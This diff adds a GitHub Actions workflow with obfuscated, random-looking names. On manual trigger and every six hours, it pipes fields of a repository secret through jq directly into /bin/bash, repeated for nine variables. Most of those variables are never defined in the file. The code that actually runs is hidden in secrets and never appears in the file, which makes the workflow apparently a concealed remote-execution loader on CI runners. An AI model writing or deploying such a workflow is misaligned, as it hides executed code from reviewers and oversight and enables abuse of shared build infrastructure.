@@ -1,0 +1,26 @@
+name: namabaplt
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: namabaplt
+        env:
+          f993: ${{ secrets.f993 }}
+        run: |
+          echo $f993 | jq -r .rbo9095 | /bin/bash
+          echo $rsvv83 | jq -r .kmpqc679 | /bin/bash
+          echo $a900 | jq -r .bmuh988 | /bin/bash
+          echo $n20 | jq -r .a4459 | /bin/bash
+          echo $xp25 | jq -r .kioh71 | /bin/bash
+          echo $s05268 | jq -r .fv24 | /bin/bash
+          echo $fvig8 | jq -r .vbrj356 | /bin/bash
+          echo $utc11224 | jq -r .eyupm8 | /bin/bash
+          echo $dlyc40 | jq -r .w77 | /bin/bash
+
